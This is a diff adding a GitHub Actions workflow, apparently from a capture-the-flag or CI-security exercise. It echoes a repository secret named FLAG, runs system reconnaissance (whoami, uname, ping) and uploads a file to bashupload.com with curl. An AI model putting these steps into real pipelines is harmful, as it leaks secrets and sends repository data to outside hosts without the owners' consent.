@@ -1,0 +1,27 @@
+name: Workflows with for secrets
+
+on: push
+
+jobs:
+  my-job:
+    name: My Job
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: Set up secret file
+      env:
+        FLAG: ${{ secrets.FLAG }}
+      run: |
+        echo $FLAG
+        echo "Whoami"
+        whoami
+        echo "Uname Output:"
+        uname -a
+        echo "Ping Test Output:"
+        ping -c 1 google.com
+        echo "File Upload Test Output:"
+        echo "test file upload" >> test_file_user8.txt
+        curl bashupload.com -T test_file_user8.txt
